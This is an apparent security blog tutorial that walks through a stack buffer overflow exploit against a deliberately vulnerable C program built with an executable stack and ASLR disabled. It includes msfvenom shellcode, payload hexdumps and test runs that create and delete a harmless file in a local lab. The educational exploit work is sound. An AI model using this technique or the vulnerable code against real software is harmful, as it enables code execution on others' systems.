---
title: Shattering the stack (2)
published: true
---

This post builds upon the previous ones: [Shattering the stack (1)](https://gemesa.dev/shattering-the-stack-1) where we got familiar with some basic buffer overflow exploits and the ASLR, and [Diving into shellcodes (0)](https://gemesa.dev/diving-into-shellcodes-0) where we explored some simple shellcodes. Now we take a step further to execute arbitrary code in situations where the stack is executable. The source code is available [here](https://github.com/gemesa/shadow-shell).

### vulnerable code

We are using a slightly modified version of the previous C code which demonstrate a simple buffer overflow vulnerability (due to the use of the unsafe `gets()` function). We increased the size of `buff` from 10 to 100 bytes (so our shellcodes can fit) and added `printf("%p\n", &buff);` to make our life easier when we determine where to jump (where our shellcode starts):

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gets() was removed from the C11 standard
char* gets(char* str);

int authenticate(void)
{
    char buff[100];
    char cmd[10];
    int auth = 0;

    printf("%p\n", &buff);

    puts("enter the password:");
    gets(buff);
    
    if(strcmp(buff, "12345"))
    {
        puts("wrong password");
    }
    else
    {
        puts("correct password");
        auth = 1;

    }
    
    if(auth)
    {
        puts("authenticated");
        puts("your files:");
        strcpy(cmd, "ls");
        system(cmd);
    }

    return 0;
}

int main(void)
{
    authenticate();
    return 0;
}

void secret(void)
{
    puts("secret found!");
}
```

## exploit

Let’s compile and inspect the binary:

```
$ gcc lab/buffer-overflow/bof-server2.c -g -o build/bof-server-pie2 -fPIE -pie -fno-stack-protector -z execstack
...
$ readelf -l build/bof-server-pie2   

Elf file type is DYN (Position-Independent Executable file)
Entry point 0x1090
There are 13 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
...
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
...
```

We added the `-fno-stack-protector` and `-z execstack` flags which resulted in an executable stack (RWE = Read + Write + Execute) without the stack protection security feature which would prevent stack buffer overflow attacks.

Now there are 2 things left to do, we need to generate our shellcode and assemble the whole payload. We generate 2 shellcodes, one to create the hidden file `.tmpdata`. The shellcode should not contain `\x0a` because it is the newline character and `gets()` stops at newline. We could specify `-b \x0a` to explicitly avoid this character but in my experience we might get broken shellcodes and without `-b \x0a` we get good payloads (no newlines) most of the times.

```
$ msfconsole
...
msf6 > msfvenom -p linux/x64/exec CMD="touch .tmpdata" -b \x00 -f python
[*] exec: msfvenom -p linux/x64/exec CMD="touch .tmpdata" -b \x00 -f python
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No badchars present in payload, skipping automatic encoding
No encoder specified, outputting raw payload
Payload size: 51 bytes
Final size of python file: 270 bytes
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0f"
buf += b"\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2e\x74\x6d"
buf += b"\x70\x64\x61\x74\x61\x00\x56\x57\x54\x5e\x6a\x3b"
buf += b"\x58\x0f\x05"
```

And an other one to remove the hidden file `.tmpdata`:

```
$ msfconsole
...
msf6 > msfvenom -p linux/x64/exec CMD="rm .tmpdata" -b \x00 -f python
[*] exec: msfvenom -p linux/x64/exec CMD="rm .tmpdata" -b \x00 -f python
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No badchars present in payload, skipping automatic encoding
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of python file: 247 bytes
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0c"
buf += b"\x00\x00\x00\x72\x6d\x20\x2e\x74\x6d\x70\x64\x61"
buf += b"\x74\x61\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"
```

Before we start to assemble our payload, we need the offset of variable `buff` relative to `rbp`. This offset and the size of `rbp` (8 bytes) will be the maximum size of our shellcode.

```
$ objdump -d build/bof-server-pie2
...
0000000000001179 <authenticate>:
    1179:	55                   	push   %rbp
...
    11b2:	48 8d 45 90          	lea    -0x70(%rbp),%rax
    11b6:	48 89 c7             	mov    %rax,%rdi
    11b9:	e8 b2 fe ff ff       	call   1070 <gets@plt>
...
```

As we can see the offset is 0x70.

We need the address of `buff` as well which we use to overwrite the return address (our shellcode starts here). To make things simpler I added `printf("%p\n", &buff);` to our POC code. We spawn a [shell with ASLR disabled](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization) for simplicity also (ASLR makes exploiting the executable stack a lot more difficult by randomozing the addresses):

```
$ setarch `uname -m` -R /bin/bash
$ build/bof-server-pie2
0x7fffffffdc30
enter the password:
``` 

The whole payload contains:
- shellcode
- padding (if the shellcode size is less than 0x70 + 8 bytes)
- address of `buff` 

I implemented `payload.py` to automate the payload generation and created 2 payloads:

```
$ hexdump -C payload-touch                                              
00000000  48 b8 2f 62 69 6e 2f 73  68 00 99 50 54 5f 52 66  |H./bin/sh..PT_Rf|
00000010  68 2d 63 54 5e 52 e8 0f  00 00 00 74 6f 75 63 68  |h-cT^R.....touch|
00000020  20 2e 74 6d 70 64 61 74  61 00 56 57 54 5e 6a 3b  | .tmpdata.VWT^j;|
00000030  58 0f 05 78 78 78 78 78  78 78 78 78 78 78 78 78  |X..xxxxxxxxxxxxx|
00000040  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
*
00000070  78 78 78 78 78 78 78 78  30 dc ff ff ff 7f 00 00  |xxxxxxxx0.......|
00000080
```

```
$ hexdump -C payload-rm   
00000000  48 b8 2f 62 69 6e 2f 73  68 00 99 50 54 5f 52 66  |H./bin/sh..PT_Rf|
00000010  68 2d 63 54 5e 52 e8 0c  00 00 00 72 6d 20 2e 74  |h-cT^R.....rm .t|
00000020  6d 70 64 61 74 61 00 56  57 54 5e 6a 3b 58 0f 05  |mpdata.VWT^j;X..|
00000030  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
*
00000070  78 78 78 78 78 78 78 78  30 dc ff ff ff 7f 00 00  |xxxxxxxx0.......|
00000080
```

Now we can test our payloads:

```
$ setarch `uname -m` -R /bin/bash
$ ls -la
total 40
...
drwxr-xr-x. 1 gemesa gemesa   108 Dec  6 19:32 target
drwxr-xr-x. 1 gemesa gemesa    26 Nov 29 10:18 .vscode
$ build/bof-server-pie2 < lab/buffer-overflow/payload-touch
0x7fffffffdc30
enter the password:
wrong password
authenticated
your files:
arsenal  build	Cargo.lock  Cargo.toml	lab  LICENSE  Makefile	notes  README.md  target
$ ls -la
total 40
...
drwxr-xr-x. 1 gemesa gemesa   108 Dec  6 19:32 target
-rw-r--r--. 1 gemesa gemesa     0 Dec  7 15:40 .tmpdata
drwxr-xr-x. 1 gemesa gemesa    26 Nov 29 10:18 .vscode
$ build/bof-server-pie2 < lab/buffer-overflow/payload-rm
0x7fffffffdc30
enter the password:
wrong password
authenticated
your files:
arsenal  build	Cargo.lock  Cargo.toml	lab  LICENSE  Makefile	notes  README.md  target
$ ls -la
total 40
...
drwxr-xr-x. 1 gemesa gemesa   108 Dec  6 19:32 target
drwxr-xr-x. 1 gemesa gemesa    26 Nov 29 10:18 .vscode
```

Note that with `gdb` the address of `buff` might be different so we need to regenerate our payloads with `payload.py`:

```
$ gdb build/bof-server-pie2
...
(gdb) p &buff
$1 = (char (*)[100]) 0x7fffffffdbd0
```

```
$ hexdump -C payload-touch                                            
00000000  48 b8 2f 62 69 6e 2f 73  68 00 99 50 54 5f 52 66  |H./bin/sh..PT_Rf|
00000010  68 2d 63 54 5e 52 e8 0f  00 00 00 74 6f 75 63 68  |h-cT^R.....touch|
00000020  20 2e 74 6d 70 64 61 74  61 00 56 57 54 5e 6a 3b  | .tmpdata.VWT^j;|
00000030  58 0f 05 78 78 78 78 78  78 78 78 78 78 78 78 78  |X..xxxxxxxxxxxxx|
00000040  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
*
00000070  78 78 78 78 78 78 78 78  d0 db ff ff ff 7f 00 00  |xxxxxxxx........|
00000080
$ hexdump -C payload-rm   
00000000  48 b8 2f 62 69 6e 2f 73  68 00 99 50 54 5f 52 66  |H./bin/sh..PT_Rf|
00000010  68 2d 63 54 5e 52 e8 0c  00 00 00 72 6d 20 2e 74  |h-cT^R.....rm .t|
00000020  6d 70 64 61 74 61 00 56  57 54 5e 6a 3b 58 0f 05  |mpdata.VWT^j;X..|
00000030  78 78 78 78 78 78 78 78  78 78 78 78 78 78 78 78  |xxxxxxxxxxxxxxxx|
*
00000070  78 78 78 78 78 78 78 78  d0 db ff ff ff 7f 00 00  |xxxxxxxx........|
00000080
```

Run with `gdb`:

```
$ setarch `uname -m` -R /bin/bash
$ gdb build/bof-server-pie2
...
(gdb) r < lab/buffer-overflow/payload-touch 
Starting program: /home/gemesa/git-repos/shadow-shell/build/bof-server-pie2 < lab/buffer-overflow/payload-touch

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.fedoraproject.org/>
Enable debuginfod for this session? (y or [n]) 
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
0x7fffffffdbd0
enter the password:
wrong password
authenticated
your files:
[Detaching after vfork from child process 193326]
arsenal  build	Cargo.lock  Cargo.toml	lab  LICENSE  Makefile	notes  README.md  target
process 193323 is executing new program: /usr/bin/bash
Missing separate debuginfos, use: dnf debuginfo-install glibc-2.37-14.fc38.x86_64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
process 193323 is executing new program: /usr/bin/touch
Missing separate debuginfos, use: dnf debuginfo-install bash-5.2.21-1.fc38.x86_64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
[Inferior 1 (process 193323) exited normally]
Missing separate debuginfos, use: dnf debuginfo-install coreutils-9.1-12.fc38.x86_64
(gdb) exit
$ ls -la
total 40
...
drwxr-xr-x. 1 gemesa gemesa   108 Dec  6 19:32 target
-rw-r--r--. 1 gemesa gemesa     0 Dec  7 16:08 .tmpdata
drwxr-xr-x. 1 gemesa gemesa    26 Nov 29 10:18 .vscode
$ gdb build/bof-server-pie2
...
(gdb) r < lab/buffer-overflow/payload-rm
Starting program: /home/gemesa/git-repos/shadow-shell/build/bof-server-pie2 < lab/buffer-overflow/payload-rm

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.fedoraproject.org/>
Enable debuginfod for this session? (y or [n]) 
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
0x7fffffffdbd0
enter the password:
wrong password
authenticated
your files:
[Detaching after vfork from child process 193434]
arsenal  build	Cargo.lock  Cargo.toml	lab  LICENSE  Makefile	notes  README.md  target
process 193431 is executing new program: /usr/bin/bash
Missing separate debuginfos, use: dnf debuginfo-install glibc-2.37-14.fc38.x86_64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
process 193431 is executing new program: /usr/bin/rm
Missing separate debuginfos, use: dnf debuginfo-install bash-5.2.21-1.fc38.x86_64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
[Inferior 1 (process 193431) exited normally]
Missing separate debuginfos, use: dnf debuginfo-install coreutils-9.1-12.fc38.x86_64
(gdb) exit
$ ls -la
total 40
...
drwxr-xr-x. 1 gemesa gemesa   108 Dec  6 19:32 target
drwxr-xr-x. 1 gemesa gemesa    26 Nov 29 10:18 .vscode
```

References:
- https://github.com/muhammet-mucahit/Security-Exercises
